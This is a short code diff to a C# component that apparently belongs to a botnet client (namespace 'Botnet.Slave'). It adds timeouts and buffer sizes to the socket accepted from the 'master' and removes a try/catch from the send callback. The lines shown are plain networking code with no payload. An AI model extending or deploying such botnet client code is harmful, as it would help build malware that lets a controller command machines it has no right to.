@@ -21,6 +21,10 @@ namespace CozyThunder.Botnet.Slave
                 TcpListener listener = (TcpListener)ar.AsyncState;
                 Socket client = listener.EndAcceptSocket(ar);
                 master_ = client;
+                master_.SendTimeout = 1000 * 10;
+                master_.ReceiveTimeout = 1000 * 10;
+                master_.SendBufferSize = 1024 * 4;
+                master_.ReceiveBufferSize = 1024 * 4;
 
                 listener_?.OnConnect(client.RemoteEndPoint.ToString());
                 StateObject state = new StateObject();
@@ -56,12 +60,8 @@ namespace CozyThunder.Botnet.Slave
 
         void SendCallback(IAsyncResult ar)
         {
-            try
-            {
-                Socket handler = (Socket)ar.AsyncState;
-                int bytesSent = handler.EndSend(ar);
-            }
-            catch {}
+            Socket handler = (Socket)ar.AsyncState;
+            int bytesSent = handler.EndSend(ar);
         }
 
         public void Send(String data)
